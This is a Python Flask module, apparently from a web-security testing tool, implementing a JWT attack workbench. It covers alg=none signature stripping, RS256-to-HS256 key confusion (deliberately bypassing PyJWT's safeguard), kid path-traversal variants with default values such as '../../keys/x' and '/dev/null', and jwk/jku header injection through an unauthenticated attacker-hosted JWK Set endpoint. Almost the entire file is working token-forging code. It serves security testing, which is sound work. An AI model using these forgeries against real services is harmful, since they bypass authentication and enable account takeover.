"""JWT workbench — decode, sign, alg-switch, key-confusion, kid traversal.

Also mints ephemeral attacker keypairs for the ``jwk`` / ``jku`` header
injection sinks (action=attacker_key), so the tester never has to drop out
to ``openssl`` / ``node`` and stand up a separate web server. The keypair is
kept in a small server-side store keyed by the browser session, and the
``jku`` mode publishes a JWK Set at ``/jwt/keys/<id>/jwks.json`` that the
target can fetch — every publish and fetch is logged to History as
``jwt/jwks-host`` (alongside the smart-input's ``jwt/jwks-fetch``).
"""
from __future__ import annotations

import base64
import contextlib
import hashlib
import hmac
import json
import secrets
import time
from collections import OrderedDict
from threading import Lock
from typing import Any
from urllib.parse import urlsplit

import jwt as pyjwt
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import ec, rsa
from flask import (
    Blueprint,
    abort,
    current_app,
    g,
    redirect,
    render_template,
    request,
    session,
    url_for,
)
from jwt.algorithms import ECAlgorithm, RSAAlgorithm

from ...a11y import summarise_jwt
from ...engines import Request, httpx_engine
from ...jwk_resolver import resolve_public_key
from .._prg import PRGCache

bp = Blueprint("jwt", __name__)

_cache = PRGCache()


HS_ALGS = ["HS256", "HS384", "HS512"]
RS_ALGS = ["RS256", "RS384", "RS512"]
ES_ALGS = ["ES256", "ES384", "ES512"]
ALL_ALGS = HS_ALGS + RS_ALGS + ES_ALGS + ["none"]

# Smart-key-input fetch: capped, redirect-disabled, short timeout.
# Kept small and predictable so a JWKS URL cannot be used to hang the
# worker or exfiltrate large blobs.
_JWKS_FETCH_TIMEOUT_SEC = 10.0


_EMPTY_FORM = {
    "token": "", "header_text": "", "payload_text": "",
    "alg": "HS256", "secret": "",
    "private_key": "", "public_key": "",
    "key_type": "RSA", "advertise": "jwk",
    "kid_values": "kid1\nkey-1\n../../keys/x\n/dev/null",
}
_EMPTY_OUT: dict[str, Any] = {
    "decoded": None, "summary": "", "signed": "",
    "alg_none": "", "key_confusion": "", "key_source": "",
    "attacker_key": "", "attacker_key_url": "",
    "kid_set": [], "error": "",
}


# =============================================================================
# Attacker-key state (ephemeral keypairs + hosted JWK Sets for jwk / jku)
# =============================================================================
#
# The keypair is per-browser-session and lives ONLY in this process (never on
# disk, never in the signed session cookie). It is reused across presses so
# the token the tester signs stays consistent with the key that is embedded
# (jwk) or hosted (jku). The hosted JWK Set contains the PUBLIC half only.

def _mint_keypair(kty: str) -> dict[str, Any]:
    """Generate an ephemeral keypair. ``kty`` is 'RSA' or 'EC'.

    Returns a record with the PKCS8 private-key PEM, the public JWK (with a
    random kid + alg), the JWS ``alg`` to use, and the kid.
    """
    kid = secrets.token_hex(4)
    if kty == "EC":
        priv: Any = ec.generate_private_key(ec.SECP256R1())
        alg = "ES256"
        public_jwk = json.loads(ECAlgorithm.to_jwk(priv.public_key()))
    else:  # RSA-2048 default
        kty = "RSA"
        priv = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        alg = "RS256"
        public_jwk = json.loads(RSAAlgorithm.to_jwk(priv.public_key()))
    public_jwk["kid"] = kid
    public_jwk["use"] = "sig"
    public_jwk["alg"] = alg
    private_pem = priv.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption(),
    ).decode("ascii")
    return {
        "kty": kty, "alg": alg, "kid": kid,
        "private_pem": private_pem, "public_jwk": public_jwk,
        "host_id": None,
    }


class _AttackerKeyState:
    """Thread-safe, bounded store of per-session attacker keypairs and the
    JWK Sets hosted for the jku sink. In-process only; cleared on restart."""

    def __init__(self, max_sessions: int = 64) -> None:
        self._lock = Lock()
        self._keys: OrderedDict[str, dict[str, Any]] = OrderedDict()
        self._hosted: OrderedDict[str, bytes] = OrderedDict()
        self._max = max_sessions

    def keypair(self, sid: str, kty: str) -> dict[str, Any]:
        """Return the session's keypair, minting a fresh one only when none
        exists yet or the requested key type changed. The stable ``host_id``
        (if any) is carried over so an already-published jku URL keeps
        working after a key-type switch."""
        with self._lock:
            rec = self._keys.get(sid)
            if rec is None or rec["kty"] != kty:
                fresh = _mint_keypair(kty)
                if rec is not None:
                    fresh["host_id"] = rec.get("host_id")
                self._keys[sid] = fresh
                self._keys.move_to_end(sid)
                self._evict_locked()
                return fresh
            self._keys.move_to_end(sid)
            return rec

    def publish_jwks(self, sid: str) -> tuple[str, bytes]:
        """Publish (or refresh) the session key's public JWK Set. Returns
        ``(host_id, jwks_bytes)``. Raises KeyError if no keypair exists."""
        with self._lock:
            rec = self._keys.get(sid)
            if rec is None:
                raise KeyError("no keypair for session")
            host_id = rec.get("host_id") or secrets.token_hex(3)
            rec["host_id"] = host_id
            jwks = json.dumps(
                {"keys": [rec["public_jwk"]]}, separators=(",", ":")
            ).encode("utf-8")
            self._hosted[host_id] = jwks
            self._hosted.move_to_end(host_id)
            while len(self._hosted) > self._max:
                self._hosted.popitem(last=False)
            return host_id, jwks

    def get_hosted(self, host_id: str) -> bytes | None:
        with self._lock:
            return self._hosted.get(host_id)

    def _evict_locked(self) -> None:
        while len(self._keys) > self._max:
            _old_sid, old = self._keys.popitem(last=False)
            hid = old.get("host_id")
            if hid:
                self._hosted.pop(hid, None)


_attacker_state = _AttackerKeyState()


def _session_id() -> str:
    """Stable per-browser-session id used to key the attacker keypair."""
    sid = session.get("jwt_sid")
    if not sid:
        sid = secrets.token_urlsafe(12)
        session["jwt_sid"] = sid
    return sid


def _ui_base_url() -> str:
    """Base URL the jku endpoint is reachable at, on the same interface as
    the UI. ``0.0.0.0`` / ``::`` (e.g. the Docker bind) is rewritten to
    ``127.0.0.1`` so the URL is actually fetchable by a local lab target."""
    settings = g.settings
    host = (getattr(settings, "ui_host", "") or "").strip()
    if host in ("0.0.0.0", "::", ""):  # noqa: S104  # comparison to rewrite an all-interfaces bind into a fetchable loopback URL, not a bind
        host = "127.0.0.1"
    port = getattr(settings, "ui_port", 8787)
    return f"http://{host}:{port}"


def _log_jwks_publish(url: str, jwks: bytes) -> None:
    """Record the act of hosting the JWK Set as a History row
    (engine=jwt/jwks-host). Best-effort; never fails the action."""
    parts = urlsplit(url)
    host = parts.hostname or ""
    if parts.port:
        host = f"{host}:{parts.port}"
    raw_req = (
        f"PUT {parts.path} HTTP/1.1\r\nHost: {host}\r\n"
        f"Content-Type: application/jwk-set+json\r\n"
        f"Content-Length: {len(jwks)}\r\n\r\n"
    ).encode("latin-1", "replace") + jwks
    raw_resp = (
        b"HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\n"
        b"JWK Set published by Reqlore; awaiting target fetch."
    )
    with contextlib.suppress(Exception):
        g.project.add_history(
            host=host, method="PUT", url=url, status=200, duration_ms=0,
            engine="jwt/jwks-host", raw_req=raw_req, raw_resp=raw_resp,
        )


def _log_jwks_host_fetch(jwks: bytes) -> None:
    """Record an inbound fetch of the hosted JWK Set (engine=jwt/jwks-host)."""
    host = request.host or ""
    ua = request.headers.get("User-Agent", "")
    raw_req = (
        f"GET {request.path} HTTP/1.1\r\nHost: {host}\r\n"
        f"User-Agent: {ua}\r\n\r\n"
    ).encode("latin-1", "replace")
    raw_resp = (
        b"HTTP/1.1 200 OK\r\n"
        b"Content-Type: application/jwk-set+json\r\n"
        + f"Content-Length: {len(jwks)}\r\n\r\n".encode("ascii")
        + jwks
    )
    with contextlib.suppress(Exception):
        g.project.add_history(
            host=host, method="GET", url=request.url, status=200,
            duration_ms=0, engine="jwt/jwks-host",
            raw_req=raw_req, raw_resp=raw_resp,
        )


def _render_raw_get(url: str, extra_headers: list[tuple[str, str]]) -> bytes:
    """Best-effort raw-bytes rendering of the outbound JWKS GET for history."""
    parts = urlsplit(url)
    path = parts.path or "/"
    if parts.query:
        path += "?" + parts.query
    host = parts.hostname or ""
    if parts.port:
        host = f"{host}:{parts.port}"
    head = f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
    head += "".join(f"{k}: {v}\r\n" for k, v in extra_headers) + "\r\n"
    return head.encode("latin-1", errors="replace")


def _render_raw_response(resp) -> bytes:
    head = f"HTTP/{resp.http_version} {resp.status} {resp.reason}\r\n"
    head += "".join(f"{k}: {v}\r\n" for k, v in resp.headers) + "\r\n"
    return head.encode("latin-1", errors="replace") + (resp.body or b"")


def _make_jwks_fetcher():
    """Return a fetcher closure suitable for jwk_resolver.resolve_public_key.

    Uses the standard httpx engine so the request is byte-for-byte the
    same as any other Reqlore HTTP call; logs into http_history so the
    tester always sees the outbound fetch; disables redirects and caps
    the timeout so a malicious JWKS URL can't hang the worker or bounce
    us into an unapproved scheme/host.
    """
    project = g.project

    def fetch(url: str) -> bytes:
        headers = [
            ("User-Agent", "Reqlore-JWT-Workbench/1.0"),
            ("Accept", "application/json, application/jwk-set+json, */*;q=0.1"),
        ]
        req = Request(method="GET", url=url, headers=headers)
        t0 = time.monotonic()
        # follow_redirects=False keeps the resolver in control of the
        # scheme allow-list; verify=False matches Reqlore's other
        # workbenches which routinely hit dev / self-signed hosts.
        resp = httpx_engine.send(
            req, follow_redirects=False, verify=False,
            timeout=_JWKS_FETCH_TIMEOUT_SEC,
        )
        duration_ms = int((time.monotonic() - t0) * 1000)
        try:
            host = urlsplit(url).hostname or ""
        except Exception:  # noqa: BLE001 - never fail the fetch over host parsing
            host = ""
        # Log the fetch to history unconditionally (success or engine
        # error) so the tester has an audit trail; history is best-effort.
        with contextlib.suppress(Exception):
            project.add_history(
                host=host, method="GET", url=url,
                status=resp.status, duration_ms=resp.timings.total_ms or duration_ms,
                engine="jwt/jwks-fetch",
                raw_req=_render_raw_get(url, headers),
                raw_resp=_render_raw_response(resp),
            )
        if resp.error:
            raise ValueError(f"Fetch failed: {resp.error}")
        if resp.status < 200 or resp.status >= 300:
            raise ValueError(f"JWKS URL returned HTTP {resp.status}.")
        return resp.body or b""

    return fetch


def _b64url_decode(s: str) -> bytes:
    pad = "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s + pad)


def _b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).decode("ascii").rstrip("=")


def _decode_unverified(token: str) -> tuple[dict, dict, str, str | None]:
    """Returns (header, payload, signature_b64, error)."""
    try:
        parts = token.strip().split(".")
        if len(parts) < 2:
            return {}, {}, "", "Not a JWT (need at least 2 dots)."
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
        sig = parts[2] if len(parts) > 2 else ""
        return header, payload, sig, None
    except Exception as e:
        return {}, {}, "", f"{type(e).__name__}: {e}"


def _forge_hs256_with_key(header: dict, payload: dict, secret_bytes: bytes) -> str:
    """RS->HS key confusion: sign header.payload with HS256 using arbitrary bytes.

    PyJWT (>=2.4) refuses to accept an asymmetric key as an HMAC secret,
    which is exactly what a vulnerable server does when it picks the
    verifier by the token's ``alg`` header. This helper reproduces that
    exact operation manually so the workbench can produce a token the
    vulnerable server will accept.
    """
    h = dict(header)
    h["alg"] = "HS256"
    header_b64 = _b64url_encode(json.dumps(h, separators=(",", ":")).encode("utf-8"))
    payload_b64 = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode("utf-8"))
    signing_input = f"{header_b64}.{payload_b64}".encode("ascii")
    sig = hmac.new(secret_bytes, signing_input, hashlib.sha256).digest()
    return f"{header_b64}.{payload_b64}.{_b64url_encode(sig)}"


@bp.route("/", methods=["GET", "POST"])
def index():
    if request.method == "GET":
        stashed = _cache.get(request.args.get("t"))
        if stashed:
            return render_template("jwt/index.html",
                                    form=stashed["form"], out=stashed["out"],
                                    algs=ALL_ALGS)
        form = dict(_EMPTY_FORM)
        # Pre-fill token from GET param when arriving via "Send to JWT".
        tok = request.args.get("token", "")
        if tok:
            form["token"] = tok
        return render_template("jwt/index.html", form=form,
                                out=dict(_EMPTY_OUT), algs=ALL_ALGS)

    # POST — do the work, stash, redirect.
    form = dict(_EMPTY_FORM)
    for k in form:
        if k in request.form:
            form[k] = request.form[k]
    out = dict(_EMPTY_OUT)
    out["kid_set"] = []
    action = request.form.get("action", "decode")

    if action == "decode":
        h, p, sig, err = _decode_unverified(form["token"])
        if err:
            out["error"] = err
        else:
            out["decoded"] = {"header": h, "payload": p, "signature": sig}
            out["summary"] = summarise_jwt(h, p)
            form["header_text"] = json.dumps(h, indent=2)
            form["payload_text"] = json.dumps(p, indent=2)

    elif action == "sign":
        try:
            hdr = json.loads(form["header_text"] or "{}")
            pl = json.loads(form["payload_text"] or "{}")
            alg = form["alg"] or "HS256"
            hdr["alg"] = alg
            if alg == "none":
                enc = _b64url_encode(json.dumps(hdr, separators=(",", ":")).encode())
                enc2 = _b64url_encode(json.dumps(pl, separators=(",", ":")).encode())
                out["signed"] = f"{enc}.{enc2}."
            else:
                key = form["private_key"] if alg.startswith(("RS", "ES")) else form["secret"]
                if not key:
                    out["error"] = "Missing key/secret."
                else:
                    out["signed"] = pyjwt.encode(pl, key, algorithm=alg, headers=hdr)
        except Exception as e:
            out["error"] = f"{type(e).__name__}: {e}"

    elif action == "attacker_key":
        # Mint (or reuse) an ephemeral attacker keypair for the jwk / jku
        # header-injection sinks. Writes the PKCS8 private PEM into the
        # existing private_key field and sets alg to RS256 / ES256, so the
        # tester finishes the forge with the normal Sign button — nothing
        # about signing changes. Advertise via:
        #   * jwk — embed the public key as a jwk member in the header;
        #   * jku — host a JWK Set and point the header's jku at it.
        kty = "EC" if (form.get("key_type") or "").upper().startswith("EC") else "RSA"
        advertise = (form.get("advertise") or "").strip().lower()
        if advertise not in ("jwk", "jku"):
            out["error"] = "Choose an advertise-via option (jwk or jku)."
        else:
            rec = _attacker_state.keypair(_session_id(), kty)
            form["private_key"] = rec["private_pem"]
            form["alg"] = rec["alg"]
            form["key_type"] = kty
            form["advertise"] = advertise
            # Preserve the rest of the header; only touch the members we own.
            try:
                hdr = json.loads(form["header_text"]) if (form["header_text"] or "").strip() else {}
                if not isinstance(hdr, dict):
                    hdr = {}
            except (ValueError, TypeError):
                hdr = {}
            hdr["alg"] = rec["alg"]
            kty_label = "RSA-2048" if kty == "RSA" else "EC P-256"
            if advertise == "jwk":
                hdr.pop("jku", None)          # jwk and jku are mutually exclusive
                hdr["jwk"] = rec["public_jwk"]
                form["header_text"] = json.dumps(hdr, indent=2)
                out["attacker_key"] = (
                    f"Attacker key generated ({kty_label}); "
                    "public half embedded as jwk."
                )
            else:  # jku
                base = _ui_base_url()
                try:
                    host_id, jwks = _attacker_state.publish_jwks(_session_id())
                    url = f"{base}/jwt/keys/{host_id}/jwks.json"
                except Exception:  # noqa: BLE001 - surface a friendly message, never a 500
                    out["error"] = f"Could not start the key-host endpoint on {base}/jwt/keys/."
                else:
                    hdr.pop("jwk", None)
                    hdr["jku"] = url
                    hdr["kid"] = rec["kid"]
                    form["header_text"] = json.dumps(hdr, indent=2)
                    out["attacker_key"] = (
                        f"Attacker key generated ({kty_label}); "
                        f"JWK Set hosted at {url}."
                    )
                    out["attacker_key_url"] = url
                    _log_jwks_publish(url, jwks)

    elif action == "alg_none":
        h, p, _sig, err = _decode_unverified(form["token"])
        if err:
            out["error"] = err
        else:
            h["alg"] = "none"
            enc = _b64url_encode(json.dumps(h, separators=(",", ":")).encode())
            enc2 = _b64url_encode(json.dumps(p, separators=(",", ":")).encode())
            out["alg_none"] = f"{enc}.{enc2}."

    elif action == "key_confusion":
        # RS256 -> HS256 trick: sign with the server's public key as if it were HMAC secret.
        # The public_key field is a "smart" input -- PEM (unchanged),
        # single JWK, full JWKS document, or JWKS URL -- resolved by
        # jwk_resolver into an SPKI PEM string before we sign.
        #
        # We deliberately bypass pyjwt.encode() for this action: PyJWT
        # >= 2.4 refuses to use an asymmetric key as an HMAC secret
        # (raises InvalidKeyError -- a defensive block against exactly
        # this footgun in normal apps). For our workbench that block
        # would prevent the tester from reproducing the exact attack
        # the vulnerable server performs; a vulnerable server does the
        # HMAC directly with the PEM bytes, so we do the same.
        h, p, _sig, err = _decode_unverified(form["token"])
        if err:
            out["error"] = err
        elif not (form["public_key"] or "").strip():
            out["error"] = (
                "Need the server's public key to forge HS256-of-pubkey. "
                "Paste a PEM, a JWK, a JWKS document, or a https://.../jwks.json URL."
            )
        else:
            try:
                pem, source = resolve_public_key(
                    form["public_key"],
                    kid=h.get("kid") if isinstance(h, dict) else None,
                    fetcher=_make_jwks_fetcher(),
                )
            except ValueError as e:
                out["error"] = f"Public key: {e}"
            else:
                try:
                    forged = _forge_hs256_with_key(h, p, pem.encode("utf-8"))
                    out["key_confusion"] = forged
                    out["key_source"] = source
                except Exception as e:  # noqa: BLE001
                    out["error"] = f"{type(e).__name__}: {e}"

    elif action == "kid_traversal":
        h, p, _sig, err = _decode_unverified(form["token"])
        if err:
            out["error"] = err
        else:
            values = [v for v in (form["kid_values"] or "").splitlines() if v.strip()]
            produced: list[tuple[str, str]] = []
            for kid in values:
                h2 = dict(h)
                h2["kid"] = kid
                h2["alg"] = "HS256"
                try:
                    tok = pyjwt.encode(p, form["secret"] or "secret", algorithm="HS256", headers=h2)
                    produced.append((kid, tok))
                except Exception as e:
                    produced.append((kid, f"<error: {e}>"))
            out["kid_set"] = produced

    token = _cache.put({"form": form, "out": out})
    return redirect(url_for(".index", t=token))


@bp.route("/keys/<host_id>/jwks.json", methods=["GET"])
def jwks_host(host_id: str):
    """Serve a hosted attacker JWK Set (public half only) for the jku sink.

    This endpoint is intentionally unauthenticated and free of any
    allow-list / SSRF guard: testers legitimately point a target's ``jku``
    header at localhost and lab IPs, and the target — not the operator's
    browser — is what fetches it. It only ever returns the generated PUBLIC
    JWK Set; the private key is never exposed here. Every fetch is logged to
    History as ``jwt/jwks-host``. Unknown ids 404.
    """
    jwks = _attacker_state.get_hosted(host_id)
    if jwks is None:
        abort(404, description="No JWK Set is hosted at this id.")
    _log_jwks_host_fetch(jwks)
    resp = current_app.response_class(jwks, mimetype="application/jwk-set+json")
    return resp
